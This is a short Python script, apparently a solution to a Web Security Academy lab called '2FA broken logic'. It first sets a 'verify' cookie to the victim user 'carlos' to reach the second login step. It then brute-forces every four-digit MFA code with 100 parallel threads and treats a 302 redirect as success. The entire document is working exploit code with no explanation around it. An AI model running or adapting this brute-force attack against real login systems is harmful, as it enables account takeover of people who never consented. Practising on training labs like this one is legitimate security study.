### 2FA broken logic

import requests
import threading
import re

# URL LAB ID
url = 'https://0a670084046b43bc80cd30dd001c00eb.web-security-academy.net'

threads = []
mfa_code = ''

# trigger the second authentication step
cookies = {
  'verify' : 'carlos'
}
response = requests.get(url=url + '/login2', cookies=cookies)
body = response.text

def find_mfa_code(i):
  data = {'mfa-code' : f'{i}'.zfill(4)}
  response = requests.post(url=url + '/login2', data=data, cookies=cookies, allow_redirects=False)
  if response.status_code == 302:
    global mfa_code
    mfa_code = f'{i}'.zfill(4)

for i in range(100):
  threads = []
  for j in range(100):
    threads.append(threading.Thread(target=find_mfa_code, args=(100 * i + j,)))
    threads[j].start()
  
  for j in range(100):
    threads[j].join()
  
  if mfa_code != '':
    print(f'Verification code: {mfa_code}') 
    break
